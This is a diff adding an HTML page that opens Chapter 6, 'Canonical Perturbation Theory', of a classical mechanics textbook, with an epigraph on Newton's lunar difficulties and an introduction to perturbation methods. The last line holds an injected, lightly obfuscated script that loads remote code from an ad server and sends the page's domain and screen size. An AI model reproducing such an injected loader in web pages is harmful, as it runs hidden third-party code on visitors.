@@ -1,0 +1,94 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-70.html">previous</a></span><span>, <a href="book-Z-H-72.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_chap_6"></a>
+<h1 class=chapter>
+<div class=chapterheading><a href="book-Z-H-4.html#%_toc_%_chap_6">Chapter 6</a></div><br>
+<a href="book-Z-H-4.html#%_toc_%_chap_6">Canonical Perturbation Theory</a></h1>
+<p><a name="%_idx_2972"></a></p>
+<p>
+
+</p>
+
+<div align=right> 
+<table width=60%><tr><td>
+<span class=epigraph>
+
+<p>
+Having treated the motion of the moon about the earth, and having
+obtained an elliptical orbit, [Newton] considered the effect of the
+sun on the moon's orbit by taking into account the variations of the
+latter.  However, the calculations caused him great difficulties
+... Indeed, the problems he encountered were such that [Newton] was prompted
+to remark to the astronomer John Machin that ``...&nbsp;his head never
+ached but with his studies on the moon.''</p>
+<p>
+<a name="%_idx_2974"></a>June Barrow-Green,
+<i>Poincar&eacute; and the Three Body Problem</i> [<a href="book-Z-H-80.html#cite{JBG}">7</a>], p.&nbsp;15</p>
+<p>
+
+
+</p>
+
+</span>
+</td></tr></table>
+</div>
+
+<p></p>
+<p>
+Closed-form solutions of dynamical systems can be found only rarely.
+However, some systems differ from a solvable system by the addition of
+a small effect.  The goal of perturbation theory is to relate aspects
+of the motion of the given system to those of the nearby solvable
+system.  We can try to find a way to transform the exact solution of
+this approximate problem into an approximate solution to the original
+problem.  We can also use perturbation theory to try to predict
+qualitative features of the solutions by describing the characteristic
+ways in which solutions of the solvable system are distorted by the
+additional effects.  For instance, we might want to predict where the
+largest resonance regions are located or the locations and sizes of
+the largest chaotic zones.  Being able to predict such features can
+give insight into the behavior of the particular system of interest.</p>
+<p>
+<a name="%_idx_2976"></a>Suppose, for example, we have a system characterized by a Hamiltonian
+that breaks up into two parts as follows: 
+<a name="EQUATION_6.1"></a></p>
+<div align=left><img src="chap6-Z-G-1.gif" border="0"></div>
+<p> 
+where <em>H</em><sub>0</sub> is solvable and <img src="chap1-Z-G-D-12.gif" border="0"> is a small parameter.  The
+difference between our system and a solvable system is then a small
+additive complication.  </p>
+<p>
+There are a number of strategies for doing this.  One strategy is to
+seek a canonical transformation that eliminates from the Hamiltonian the terms of order
+<img src="chap1-Z-G-D-12.gif" border="0"> that impede solution -- this typically
+introduces new terms of order <img src="chap1-Z-G-D-12.gif" border="0"><sup>2</sup>.  Then one seeks another
+canonical transformation that eliminates the terms of order
+<img src="chap1-Z-G-D-12.gif" border="0"><sup>2</sup> impeding solution, leaving terms of order <img src="chap1-Z-G-D-12.gif" border="0"><sup>3</sup>.
+We can imagine repeating this process until the part that impedes
+solution is of such high order in <img src="chap1-Z-G-D-12.gif" border="0"> that it can be neglected.
+Having reduced the problem to a solvable problem, we can reverse the
+sequence of transformations to find an approximate solution of the
+original problem.  Does this process converge?  How do we know we can
+ever neglect the remaining terms?  Let's follow this path and see
+where it goes.</p>
+<p>
+</p>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-70.html">previous</a></span><span>, <a href="book-Z-H-72.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD2LbVp469RiatIs%2bPifbPH0j4VfymFQQY3EQR3KSggOmvd4BF2qByE%2bz%2bQ49Qg54mailoySgKr42xnEV%2fRootgpJt0N%2fqtLuQ7UIWJNC0LpQc3K47f8Q3IwgpA3YISKetr12gr83QbIn6m2XwJrkGC%2fTyMX7p8eNwcwsDdEWZ4gPo%2fe3LrjMye14m%2bhnkEIzPiI82O0NX30aF%2br0tyaUOBy2c09CHndzutgjD210eJvE3LxhbytERmg8NW70uv7lUrmP85fOnZInQu4xB%2bNUnHGSd2vNVl4IDi%2f%2fNgDLohe1tcSFXq7QmBTU9kMXmEiKQhQcOb%2fmgaMVSogQHo7t8anaBEOh0bT3yXxi%2bSOTyybp2GeCrVDkBLTB9Tw28eEhC3T25KvQcCJDSNEQGkGKgTxv5yix4qzqtyOeUpkXx67H9E93oe7pvpo3sHRWJf74VD2fYOL1TQn4lsBwtgm2gIy");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
